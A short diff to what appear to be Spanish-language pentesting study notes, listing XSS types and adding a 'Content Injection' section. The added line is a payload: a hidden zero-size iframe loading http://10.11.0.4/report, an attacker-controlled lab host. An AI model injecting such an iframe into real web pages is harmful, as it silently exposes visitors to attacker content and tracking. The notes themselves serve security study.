@@ -27,4 +27,8 @@ C:\xampp\xampp_stop.exe
 - XSS reflejado
 - XSS persistente
 - XSS basado en DOM
-- 
+
+#### Content Injection
+```
+<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> 
+```
